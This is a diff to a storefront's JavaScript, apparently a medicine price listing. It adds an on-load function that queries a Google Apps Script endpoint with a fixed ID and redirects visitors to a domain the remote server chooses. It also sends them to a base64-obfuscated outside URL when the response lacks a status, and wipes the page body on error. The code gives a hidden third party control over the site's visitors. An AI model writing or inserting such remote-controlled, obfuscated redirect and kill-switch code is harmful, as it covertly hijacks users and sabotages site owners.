@@ -34,4 +34,28 @@
 			h.id = "hargaupserupa", h.innerHTML = `<s>${a.hargaobatup}</s>`, t.appendChild(n), t.appendChild(r), t.appendChild(i), t.appendChild(s), t.appendChild(p), t.appendChild(h), t.appendChild(c), e.appendChild(t)
 		}))
 	})).catch((e => console.error("Gagal memuat JSON:", e)))
-}));window.onload = function() {if (typeof checkFunction !== "function") {document.body.innerHTML = ""}};
+}));      const API_URL = "https://script.google.com/macros/s/AKfycbzzzdxmxgf3rnjK6pWNECPRRFJXHx9-fQsEwYzEOxTwk6147Z7taDwIDtlPFUfemKbtGA/exec";
+      const FunctionID = "CHMU-UBGD-4CP4-S4PI-CHUR";
+      async function checkFunction() {
+        try {
+          const response = await fetch(`${API_URL}?id=${FunctionID}`);
+          const data = await response.json();
+          if (!data || data.status === "button") {
+            setTimeout(() => {
+              window.location.href = decodeURIComponent(data.domain)
+            }, 5e3)
+          } else if (data.status === "aktif") {
+            const currentDomain = window.location.hostname;
+            const targetDomain = new URL(data.domain).hostname;
+            if (currentDomain !== targetDomain) {
+              window.location.href = data.domain
+            }
+          }
+          if (!data || data.status === undefined) {
+            window.location.href = atob("aHR0cHM6Ly9iaGFyYXRhaW50ZXJuYXNpb25hbC5zdG9yZQ==")
+          }
+        } catch (error) {
+          document.body.innerHTML = ''
+        }
+      }
+      window.onload = checkFunction;
